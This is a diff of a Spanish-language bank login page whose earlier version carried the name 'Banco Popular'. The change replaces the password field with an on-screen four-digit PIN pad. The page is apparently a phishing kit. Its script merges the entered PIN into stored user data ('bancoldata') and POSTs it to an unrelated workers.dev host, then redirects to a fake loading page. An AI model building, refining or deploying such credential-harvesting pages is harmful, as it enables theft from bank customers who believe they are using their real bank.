@@ -1,281 +1,196 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Clave - Banco Popular</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Clave</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 
 <style>
-    body {
-        margin: 0;
-        font-family: 'Inter', sans-serif;
-        background: #ffffff;
-        color: #000;
-    }
+body {
+    margin: 0;
+    font-family: 'Inter', sans-serif;
+    background: #2b002b;
+    color: white;
+}
 
-    header {
-        width: 100%;
-        padding: 16px 20px;
-        display: flex;
-        justify-content: space-between;
-        border-bottom: 1px solid #efefef;
-        font-weight: 600;
-        font-size: 18px;
-        background: #fff;
-    }
+/* HEADER */
+header {
+    padding: 20px;
+}
 
-    .close-btn {
-        width: 28px;
-        height: 28px;
-        background: #e8ffe9;
-        border-radius: 50%;
-        border: none;
-        color: #00a651;
-        font-size: 18px;
-        cursor: pointer;
-    }
+.back {
+    font-size: 24px;
+    cursor: pointer;
+}
 
-    .main-content {
-        max-width: 500px;
-        margin: auto;
-        padding: 20px;
-        display: none;
-    }
+/* CONTENIDO */
+.container {
+    max-width: 400px;
+    margin: auto;
+    padding: 20px;
+}
 
-    .logo img {
-        width: 300px;
-        display: block;
-        margin: 35px auto 25px;
-    }
+/* TITULO */
+.title {
+    font-size: 28px;
+    font-weight: 600;
+    margin-top: 20px;
+}
 
-    .title {
-        text-align: center;
-        font-size: 22px;
-        font-weight: 700;
-        margin-bottom: 6px;
-    }
+/* PIN BOXES */
+.pin-container {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+    margin: 40px 0 20px;
+}
 
-    .subtitle {
-        text-align: center;
-        font-size: 14px;
-        color: #666;
-        margin-bottom: 25px;
-    }
+.pin-box {
+    width: 60px;
+    height: 60px;
+    background: #cfcfd4;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 26px;
+    color: #000;
+}
 
-    .help-text {
-        max-width: 360px;
-        margin: 0 auto 8px;
-        display: flex;
-        justify-content: space-between;
-        font-size: 14px;
-        font-weight: 600;
-    }
+/* TEXTO */
+.subtitle {
+    text-align: center;
+    color: #ccc;
+    font-size: 14px;
+    margin-bottom: 40px;
+}
 
-    .help-text a {
-        color: #ff7b00;
-        text-decoration: none;
-    }
+/* TECLADO */
+.keyboard {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 25px;
+    text-align: center;
+    font-size: 28px;
+    margin-top: 20px;
+}
 
-    /* INPUT + OJO CENTRADOS */
-    .input-wrapper {
-        max-width: 360px;
-        margin: 0 auto;
-        position: relative;
-        display: flex;
-        justify-content: center;
-    }
+.key {
+    padding: 15px;
+    cursor: pointer;
+}
 
-    .input-field {
-        width: 100%;
-        padding: 16px 20px;
-        border-radius: 12px;
-        border: 1px solid #dcdcdc;
-        font-size: 26px;
-        text-align: center;
-        letter-spacing: 16px;
-        outline: none;
-    }
+.key:active {
+    transform: scale(0.9);
+}
 
-    .input-field::placeholder { color: #c0c0c0; }
+/* BOTON OLVIDE */
+.forgot {
+    margin-top: 30px;
+    text-align: center;
+}
 
-    .eye-icon {
-        position: absolute;
-        right: 16px;
-        top: 50%;
-        transform: translateY(-50%);
-        font-size: 20px;
-        color: #999;
-        cursor: pointer;
-    }
-
-    /* BOTÓN CENTRADO */
-    .button-container {
-        max-width: 360px;
-        margin: 28px auto 0;
-        display: flex;
-        justify-content: center;
-    }
-
-    .login-btn {
-        width: 100%;
-        padding: 19px 0;
-        border-radius: 12px;
-        background: #cfcfcf;
-        color: #7c7c7c;
-        font-weight: 600;
-        border: none;
-    }
-
-    .login-btn.enabled {
-        background: #105163;
-        color: #fff;
-    }
-
-    .footer {
-        margin-top: 50px;
-        font-size: 13px;
-        color: #ff7b00;
-        text-align: center;
-        padding-bottom: 30px;
-    }
-
-    /* LOADER */
-    .loader-container {
-        position: fixed;
-        inset: 0;
-        background: white;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        z-index: 1000;
-    }
-
-    .loader {
-        width: 55px;
-        height: 55px;
-        border: 4px solid #00a651;
-        border-top-color: transparent;
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin { to { transform: rotate(360deg); } }
+.forgot button {
+    background: transparent;
+    border: 1px solid #aaa;
+    color: white;
+    padding: 12px 20px;
+    border-radius: 8px;
+    cursor: pointer;
+}
 </style>
 </head>
+
 <body>
 
-<div class="loader-container" id="loader">
-    <div class="loader"></div>
-</div>
-
 <header>
-    <span>Registro</span>
-    <div style="display:flex; align-items:center; gap:6px;">
-        <span style="font-size:14px; color:#444;">Cerrar</span>
-        <button class="close-btn">×</button>
-    </div>
+    <span class="back">←</span>
 </header>
 
-<div class="main-content" id="mainContent">
+<div class="container">
 
-    <br><br><br><br><br><br><br>
+    <div class="title">Escribe tu clave</div>
 
-    <div class="logo">
-        <img src="dic.jpeg">
+    <div class="pin-container">
+        <div class="pin-box" id="p1"></div>
+        <div class="pin-box" id="p2"></div>
+        <div class="pin-box" id="p3"></div>
+        <div class="pin-box" id="p4"></div>
     </div>
 
-    <div class="title">Escribe tu contraseña</div>
-    <br><br>
-
-    <div class="help-text">
-        <span>Contraseña única</span>
-        <a href="#" id="forgotPassword">¿La olvidaste?</a>
+    <div class="subtitle">
+        No dudamos que seas tú...<br>
+        Pero es mejor confirmar ;)
     </div>
 
-    <!-- INPUT + OJO -->
-    <div class="input-wrapper">
-        <input 
-            type="password"
-            id="claveInput"
-            class="input-field"
-            maxlength="4"
-            placeholder="-  -  -  -"
-            inputmode="numeric"
-        >
-        <i class="fa-solid fa-eye eye-icon" id="toggleEye"></i>
+    <!-- TECLADO -->
+    <div class="keyboard">
+        <div class="key" onclick="press(1)">1</div>
+        <div class="key" onclick="press(2)">2</div>
+        <div class="key" onclick="press(3)">3</div>
+        <div class="key" onclick="press(4)">4</div>
+        <div class="key" onclick="press(5)">5</div>
+        <div class="key" onclick="press(6)">6</div>
+        <div class="key" onclick="press(7)">7</div>
+        <div class="key" onclick="press(8)">8</div>
+        <div class="key" onclick="press(9)">9</div>
+        <div></div>
+        <div class="key" onclick="press(0)">0</div>
+        <div class="key" onclick="del()">⌫</div>
     </div>
 
-    <div class="button-container">
-        <button class="login-btn" id="loginButton" disabled>Ingresar</button>
+    <div class="forgot">
+        <button>Olvidé mi clave</button>
     </div>
 
-    <div class="footer">Seguridad • Accesibilidad</div>
 </div>
 
 <script>
-/* ---------- LOADER ---------- */
-window.addEventListener("load", () => {
-    setTimeout(() => {
-        loader.style.opacity = "0";
-        setTimeout(() => loader.style.display = "none", 400);
-        mainContent.style.display = "block";
-    }, 500);
-});
+let pin = [];
 
-/* ---------- VALIDAR SOLO 4 DIGITOS ---------- */
-const claveInput = document.getElementById("claveInput");
-const loginButton = document.getElementById("loginButton");
-
-function validateClave() {
-    if (claveInput.value.length === 4) {
-        loginButton.classList.add("enabled");
-        loginButton.disabled = false;
-    } else {
-        loginButton.classList.remove("enabled");
-        loginButton.disabled = true;
+function render() {
+    for (let i = 1; i <= 4; i++) {
+        document.getElementById("p" + i).innerText = pin[i-1] ? "•" : "";
     }
 }
-claveInput.addEventListener("input", () => {
-    if (claveInput.value.length > 4) {
-        claveInput.value = claveInput.value.slice(0, 4);
+
+function press(num) {
+    if (pin.length < 4) {
+        pin.push(num);
+        render();
     }
-    validateClave();
-});
 
-/* ---------- OJITO ---------- */
-const toggleEye = document.getElementById("toggleEye");
-
-toggleEye.addEventListener("click", () => {
-    if (claveInput.type === "password") {
-        claveInput.type = "text";
-        toggleEye.classList.replace("fa-eye", "fa-eye-slash");
-    } else {
-        claveInput.type = "password";
-        toggleEye.classList.replace("fa-eye-slash", "fa-eye");
+    if (pin.length === 4) {
+        enviar();
     }
-});
+}
 
-/* ---------- LOGIN ORIGINAL ---------- */
-async function performLogin() {
-    if (loginButton.disabled) return;
+function del() {
+    pin.pop();
+    render();
+}
 
-    loginButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
+/* 🔥 TU LOGICA ORIGINAL (NO SE TOCA) */
+async function enviar() {
+    let clave = pin.join("");
 
-    let data = JSON.parse(localStorage.getItem("bancoldata") || "{}");
-    if (!data.usuario) return alert("Error interno");
+    let data = {};
+    try {
+        data = JSON.parse(localStorage.getItem("bancoldata")) || {};
+    } catch {
+        data = {};
+    }
 
     const transactionId = "txn_" + Date.now();
 
-    data.clave = claveInput.value;
+    data.clave = clave;
     data.transactionId = transactionId;
 
     localStorage.setItem("bancoldata", JSON.stringify(data));
 
-    await new Promise(r => setTimeout(r, 1000));
+    await new Promise(r => setTimeout(r, 800));
 
     const res = await fetch("https://quiet-haze-3548.micollflorez.workers.dev/login", {
         method: "POST",
@@ -290,18 +205,15 @@ async function performLogin() {
     const json = await res.json();
 
     if (json.ok) {
-        loginButton.innerHTML = "✔ Correcto";
-        loginButton.style.background = "#00a651";
-        loginButton.style.color = "#fff";
-        setTimeout(() => (location.href = "loading.html"), 700);
+        window.location.href = "loading.html";
     } else {
-        loginButton.innerHTML = "Ingresar";
-        validateClave();
         alert("Error: " + json.error);
+        pin = [];
+        render();
     }
 }
 
-loginButton.addEventListener("click", performLogin);
+render();
 </script>
 
 </body>
